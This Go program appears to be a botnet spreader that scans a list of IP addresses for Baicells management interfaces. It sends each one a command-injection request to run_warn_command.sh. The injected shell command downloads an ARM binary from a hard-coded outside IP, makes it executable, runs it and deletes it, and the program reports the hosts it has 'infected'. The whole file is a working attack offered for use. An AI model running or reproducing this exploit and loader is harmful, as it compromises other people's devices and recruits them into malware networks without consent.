package main

import (
	"bufio"
	"fmt"
	"net/http"
	"os"
	"strings"
	"sync"
)

const (
	command  = "rm%20-rf%20Acid.3wget%3Bwget%20http%3A%2F%2F172.245.186.149%2FAcid.arm7%20-O%20Acid.3wget%3Bchmod%20777%20Acid.3wget%3B.%2FAcid.3wget%20arm7.wget%3Brm%20-rf%20Acid.3wget%3B"
	execMsg  = "I-STILL-MISS-YOU-NOEY-<3"
	userAgent = "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:84.0) Gecko/20100101 Firefox/84.0"
)

func main() {
	if len(os.Args) != 2 {
		fmt.Println("Usage: go run main.go <port>")
		return
	}

	port := os.Args[1]
	scanner := bufio.NewScanner(os.Stdin)

	var wg sync.WaitGroup
	for scanner.Scan() {
		ip := scanner.Text()
		wg.Add(1)
		go func(ip string) {
			defer wg.Done()
			checkAndExecute(ip, port)
		}(ip)
	}
	wg.Wait()
}

func checkAndExecute(ip, port string) {
	client := &http.Client{}

	resp, err := client.Get(fmt.Sprintf("http://%s:%s", ip, port))
	if err != nil {
		return
	}
	defer resp.Body.Close()

	if strings.Contains(resp.Status, "200 OK") && strings.Contains(resp.Header.Get("Server"), "Baicells Management Utility") {
		fmt.Printf("[LOVE] Found %s\n", ip)

		payload := fmt.Sprintf("commands=S||%s&hash=browser_time%%3D1608466780", command)
		resp, err = client.Post(fmt.Sprintf("https://%s:%s/utility/run_warn_command.sh", ip, port), "application/x-www-form-urlencoded", strings.NewReader(payload))
		if err != nil {
			return
		}
		defer resp.Body.Close()

		if strings.Contains(execMsg, resp.Status) {
			fmt.Printf("[LOVE] Infected: %s\n", ip)
		}
	}
}
